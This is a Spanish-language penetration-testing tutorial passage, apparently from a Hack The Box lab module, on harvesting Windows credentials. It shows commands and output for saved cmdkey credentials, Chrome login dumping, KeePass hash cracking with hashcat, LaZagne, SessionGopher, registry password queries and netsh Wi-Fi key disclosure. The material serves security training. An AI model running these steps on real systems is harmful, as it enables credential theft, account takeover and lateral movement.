Hay muchas otras técnicas que podemos usar para obtener credenciales en un sistema Windows. Esta sección no cubrirá todos los escenarios posibles, pero repasaremos los más comunes.

## Cmdkey Saved Credentials

### Listing Saved Credentials

El comando [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) se puede usar para crear, listar y eliminar nombres de usuario y contraseñas almacenados. Los usuarios pueden desear almacenar credenciales para un host específico o usarlo para almacenar credenciales para conexiones de servicios terminales para conectarse a un host remoto usando Remote Desktop sin necesidad de ingresar una contraseña. Esto puede ayudarnos a movernos lateralmente a otro sistema con un usuario diferente o escalar privilegios en el host actual para aprovechar las credenciales almacenadas de otro usuario.

```r
C:\htb> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
	
```

Cuando intentemos usar RDP al host, se usarán las credenciales guardadas.

![image](https://academy.hackthebox.com/storage/modules/67/cmdkey_rdp.png)

También podemos intentar reutilizar las credenciales usando `runas` para enviarnos una reverse shell como ese usuario, ejecutar un binario o lanzar una consola de PowerShell o CMD con un comando como:

### Run Commands as Another User

```r
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

---

## Browser Credentials

### Retrieving Saved Credentials from Chrome

Los usuarios a menudo almacenan credenciales en sus navegadores para aplicaciones que visitan con frecuencia. Podemos usar una herramienta como [SharpChrome](https://github.com/GhostPack/SharpDPAPI) para recuperar cookies y logins guardados de Google Chrome.

```r
PS C:\htb> .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0


[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user



[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0


--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1
```

---

## Password Managers

Muchas empresas proporcionan gestores de contraseñas a sus usuarios. Esto puede ser en forma de una aplicación de escritorio como `KeePass`, una solución basada en la nube como `1Password`, o una bóveda de contraseñas empresarial como `Thycotic` o `CyberArk`. Obtener acceso a un gestor de contraseñas, especialmente uno utilizado por un miembro del personal de IT o de todo un departamento, puede llevar a un acceso de nivel administrador a objetivos de alto valor como dispositivos de red, servidores, bases de datos, etc. Podemos obtener acceso a una bóveda de contraseñas a través del uso de contraseñas o adivinando una contraseña débil/común. Algunos gestores de contraseñas como `KeePass` se almacenan localmente en el host. Si encontramos un archivo `.kdbx` en un servidor, workstation o file share, sabemos que estamos tratando con una base de datos `KeePass` que a menudo está protegida solo por una contraseña maestra. Si podemos descargar un archivo `.kdbx` a nuestro host de ataque, podemos usar una herramienta como [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) para extraer el hash de la contraseña y ejecutarlo a través de una herramienta de cracking de contraseñas como [Hashcat](https://github.com/hashcat) o [John the Ripper](https://github.com/openwall/john).

### Extracting KeePass Hash

Primero, extraemos el hash en formato Hashcat usando el script `keepass2john.py`.

```r
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 

ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
```

### Cracking Hash Offline

Luego podemos alimentar el hash a Hashcat, especificando [hash mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 para KeePass. Si tiene éxito, podemos obtener acceso a una gran cantidad de credenciales que se pueden usar para acceder a otras aplicaciones/sistemas o incluso a dispositivos de red, servidores, bases de datos, etc., si podemos obtener acceso a una base de datos de contraseñas utilizada por el personal de IT.

```r
hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)
Hash.Target......: $keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d...39c154
Time.Started.....: Fri Aug  6 11:17:47 2021 (22 secs)
Time.Estimated...: Fri Aug  6 11:18:09 2021 (0 secs)
Guess.Base.......: File (/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      276 H/s (4.79ms) @ Accel:1024 Loops:16 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59984-60000
Candidates.#1....: 123456 -> iheartyou

Started: Fri Aug  6 11:17:45 2021
Stopped: Fri Aug  6 11:18:11 2021
```

---

## Email

Si obtenemos acceso a un sistema unido al dominio en el contexto de un usuario de dominio con un buzón de Microsoft Exchange, podemos intentar buscar en el correo electrónico del usuario términos como "pass", "creds", "credentials", etc. usando la herramienta [MailSniper](https://github.com/dafthack/MailSniper).

---

## More Fun with Credentials

Cuando todo lo demás falla, podemos ejecutar la herramienta [LaZagne](https://github.com/AlessandroZ/LaZagne) en un intento de recuperar credenciales de una amplia variedad de software. Dicho software incluye navegadores web, clientes de chat, bases de datos, correos electrónicos, dumps de memoria, varias herramientas de sysadmin y mecanismos internos de almacenamiento de contraseñas (es decir, Autologon, Credman, DPAPI, LSA secrets, etc.). La herramienta se puede usar para ejecutar todos los módulos, módulos específicos (como bases de datos) o contra un software en particular (es decir, OpenVPN). La salida se puede guardar en un archivo de texto estándar o en formato JSON. Vamos a probarla.

### Viewing LaZagne Help Menu

Podemos ver el menú de ayuda con la flag `-h`.

```r
PS C:\htb> .\lazagne.exe -h

usage: lazagne.exe [-h] [-version]
                   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                   ...
				   
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

positional arguments:
  {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                        Choose a main command
    chats               Run chats module
    mails               Run mails module
    all                 Run all modules
    git                 Run git module
    svn                 Run svn module
    windows             Run windows module
    wifi                Run wifi module
    maven               Run maven module
    sysadmin            Run sysadmin module
    browsers            Run browsers module
    games               Run games module
    multimedia          Run multimedia module
    memory              Run memory module
    databases           Run databases module
    php                 Run php module

optional arguments:
  -h, --help            show this help message and exit
  -version              laZagne version
```

### Running All LaZagne Modules

Como podemos ver, hay muchos módulos disponibles para nosotros. Ejecutar la herramienta con `all` buscará aplicaciones compatibles y devolverá cualquier credencial en texto claro descubierta. Como podemos ver en el ejemplo a continuación, muchas aplicaciones no almacenan credenciales de manera segura (lo mejor es nunca almacenar credenciales, ¡en absoluto!). Pueden recuperarse fácilmente y usarse para escalar privilegios localmente, moverse a otro sistema o acceder a datos sensibles.

```r
PS C:\htb> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------

[+] Password found !!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q 1

[+] 2 passwords have been found.

For more information launch it again with the -v option

elapsed time = 5.50499987602
```

---

## Even More Fun with Credentials

Podemos usar [SessionGopher](https://github.com/Arvanaghi/SessionGopher) para extraer credenciales guardadas de PuTTY, WinSCP, FileZilla, SuperPuTTY y RDP. La herramienta está escrita en PowerShell y busca y descifra la información de inicio de sesión guardada para herramientas de acceso remoto. Puede ejecutarse localmente o de forma remota. Busca en la hive `HKEY_USERS` para todos los usuarios que han iniciado sesión en un host unido al dominio (o independiente) y busca y descifra cualquier información de sesión guardada que pueda encontrar. También puede ejecutarse para buscar archivos de clave privada PuTTY (.ppk), Remote Desktop (.rdp) y RSA (.sdtid).

### Running SessionGopher as Current User

Necesitamos acceso de administrador local para recuperar la información de sesión almacenada para cada usuario en `HKEY_USERS`, pero siempre vale la pena ejecutarlo como nuestro usuario actual para ver si podemos encontrar credenciales útiles.

```r
PS C:\htb> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
 
          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
 
[+] Digging on WINLPE-SRV01...
WinSCP Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :
 
 
PuTTY Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local
 

 
SuperPuTTY Sessions
 
 
Source        : WINLPE-SRV01\htb-student
SessionId     : NIX03
SessionName   : NIX03
Host          : nix03.inlanefreight.local
Username      : srvadmin
ExtraArgs     :
Port          : 22
Putty Session : Default Settings
```

---

## Clear-Text Password Storage in the Registry

Ciertos programas y configuraciones de Windows pueden resultar en contraseñas en texto claro u otros datos almacenados en el registro. Si bien las herramientas como `Lazagne` y `SessionGopher` son una excelente manera de extraer credenciales, como pentesters también debemos estar familiarizados y cómodos con enumerarlas manualmente.

### Windows AutoLogon

Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) es una función que permite a un usuario configurar su sistema operativo Windows para iniciar sesión automáticamente en una cuenta de usuario específica, sin necesidad de ingresar manualmente el nombre de usuario y la contraseña en cada inicio. Sin embargo, una vez configurado, el nombre de usuario y la contraseña se almacenan en el registro, en texto claro. Esta función se usa comúnmente en sistemas de un solo usuario o en situaciones donde la conveniencia supera la necesidad de una mayor seguridad.

Las claves del registro asociadas con Autologon se pueden encontrar en `HKEY_LOCAL_MACHINE` en la siguiente hive y pueden ser accesibles por usuarios estándar:

```r
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

La configuración típica de una cuenta Autologon implica la configuración manual de las siguientes claves de registro:

- `AdminAutoLogon` - Determina si Autologon está habilitado o deshabilitado. Un valor de "1" significa que está habilitado.
- `DefaultUserName` - Contiene el valor del nombre de usuario de la cuenta que iniciará sesión automáticamente.
- `DefaultPassword` - Contiene el valor de la contraseña para la cuenta de usuario especificada anteriormente.

### Enumerating Autologon with reg.exe

```r
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

**`Note:`** Si absolutamente debes configurar Autologon para tu sistema Windows, se recomienda usar Autologon.exe de la suite Sysinternals, que encriptará la contraseña como un LSA secret.

### Putty

Para las sesiones de Putty que utilizan una conexión proxy, cuando se guarda la sesión, las credenciales se almacenan en el registro en texto claro.

```r
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

Tenga en cuenta que los controles de acceso para esta clave de registro específica están vinculados a la cuenta de usuario que configuró y guardó la sesión. Por lo tanto, para verlo, necesitaríamos iniciar sesión como ese usuario y buscar en la hive `HKEY_CURRENT_USER`. Posteriormente, si tuviéramos privilegios de administrador, podríamos encontrarlo en la hive correspondiente del usuario en `HKEY_USERS`.

### Enumerating Sessions and Finding Credentials:

Primero, necesitamos enumerar las sesiones guardadas disponibles:

```r
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

A continuación, miramos las claves y valores de la sesión descubierta "`kali%20ssh`":

```r
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  <SNIP>
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!    
```

En este ejemplo, podemos imaginar el escenario de que el administrador de IT ha configurado Putty para un usuario en su entorno, pero desafortunadamente usó sus credenciales de administrador en la conexión proxy. La contraseña podría extraerse y potencialmente reutilizarse en toda la red.

Para obtener información adicional sobre `reg.exe` y trabajar con el registro, asegúrese de revisar el módulo [Introduction to Windows Command Line](https://academy.hackthebox.com/module/167/section/1623).

---

## Wifi Passwords

### Viewing Saved Wireless Networks

Si obtenemos acceso de administrador local a una workstation de un usuario con una tarjeta inalámbrica, podemos enumerar cualquier red inalámbrica a la que se hayan conectado recientemente.

```r
C:\htb> netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp
```

### Retrieving Saved Wireless Passwords

Dependiendo de la configuración de la red, podemos recuperar la clave precompartida (`Key Content` a continuación) y potencialmente acceder a la red objetivo. Aunque raro, podemos encontrarnos con esto durante una evaluación y usar este acceso para saltar a una red inalámbrica separada y obtener acceso a recursos adicionales.

```r
C:\htb> netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : ilfreight_corp
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "ilfreight_corp"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : ILFREIGHTWIFI-CORP123908!

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default
```